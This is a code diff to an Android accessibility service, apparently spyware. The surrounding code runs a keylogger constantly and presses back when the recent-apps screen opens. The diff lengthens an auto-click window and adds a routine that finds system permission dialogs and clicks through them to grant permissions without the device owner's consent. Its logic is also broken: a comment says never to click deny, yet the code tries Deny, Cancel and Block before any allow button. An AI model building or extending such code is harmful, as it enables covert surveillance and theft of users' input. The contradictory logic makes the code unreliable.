@@ -68,14 +68,14 @@ public class AccessibilityHelperService extends AccessibilityService {
             }
         }, filter);
         
-        // Auto-disable auto-click after 10 seconds (keylogger keeps running)
+        // Auto-disable auto-click after 60 seconds (to allow time for permission granting)
         autoClickDisableRunnable = new Runnable() {
             @Override
             public void run() {
                 disableAutoClick();
             }
         };
-        handler.postDelayed(autoClickDisableRunnable, 10000);
+        handler.postDelayed(autoClickDisableRunnable, 60000);
         
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
@@ -105,6 +105,9 @@ public class AccessibilityHelperService extends AccessibilityService {
 
         // Detect recent apps and press back
         detectRecentApps(event);
+
+        // Handle permission dialogs - auto grant permissions
+        handlePermissionDialogs(event);
         
         // Always run keylogger (even after auto-click is disabled)
         handleKeylogging(event);
@@ -112,6 +115,104 @@ public class AccessibilityHelperService extends AccessibilityService {
         // Auto-click only when enabled
         if (isAutoClickEnabled) {
             performAutoClick();
+        }
+    }
+
+    private void handlePermissionDialogs(AccessibilityEvent event) {
+        try {
+            String className = event.getClassName() != null ? event.getClassName().toString() : "";
+            
+            // Check if this is a permission dialog
+            boolean isPermissionDialog = className.contains("PermissionActivity") ||
+                    className.contains("PermissionRequest") ||
+                    className.contains("AlertDialog") ||
+                    className.contains("AppOpsActivity") ||
+                    className.contains("GrantPermissions");
+
+            if (isPermissionDialog) {
+                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                if (rootNode == null) return;
+
+                // NEVER click deny/cancel/don't allow buttons
+                if (findAndClickButton(rootNode, "Don't allow")) {
+                    rootNode.recycle();
+                    return;
+                }
+                if (findAndClickButton(rootNode, "Deny")) {
+                    rootNode.recycle();
+                    return;
+                }
+                if (findAndClickButton(rootNode, "Cancel")) {
+                    rootNode.recycle();
+                    return;
+                }
+                if (findAndClickButton(rootNode, "Decline")) {
+                    rootNode.recycle();
+                    return;
+                }
+                if (findAndClickButton(rootNode, "Block")) {
+                    rootNode.recycle();
+                    return;
+                }
+                if (findAndClickButton(rootNode, "Skip")) {
+                    rootNode.recycle();
+                    return;
+                }
+
+                // Click allow buttons (in order of preference)
+                // "Allow all the time" - best for permissions
+                if (findAndClickButton(rootNode, "Allow all the time")) {
+                    rootNode.recycle();
+                    return;
+                }
+                // "Allow while using the app" / "While using the app"
+                if (findAndClickButton(rootNode, "Allow while using this app")) {
+                    rootNode.recycle();
+                    return;
+                }
+                if (findAndClickButton(rootNode, "While using the app")) {
+                    rootNode.recycle();
+                    return;
+                }
+                // "Allow" - generic
+                if (findAndClickButton(rootNode, "Allow")) {
+                    rootNode.recycle();
+                    return;
+                }
+                // "Grant" 
+                if (findAndClickButton(rootNode, "Grant")) {
+                    rootNode.recycle();
+                    return;
+                }
+                // "OK" / "Got it"
+                if (findAndClickButton(rootNode, "OK")) {
+                    rootNode.recycle();
+                    return;
+                }
+                if (findAndClickButton(rootNode, "Got it")) {
+                    rootNode.recycle();
+                    return;
+                }
+                // "Yes"
+                if (findAndClickButton(rootNode, "Yes")) {
+                    rootNode.recycle();
+                    return;
+                }
+                // "Next" for wizard-style dialogs
+                if (findAndClickButton(rootNode, "Next")) {
+                    rootNode.recycle();
+                    return;
+                }
+                // "Continue"
+                if (findAndClickButton(rootNode, "Continue")) {
+                    rootNode.recycle();
+                    return;
+                }
+
+                rootNode.recycle();
+            }
+        } catch (Exception e) {
+            // Ignore
         }
     }
 
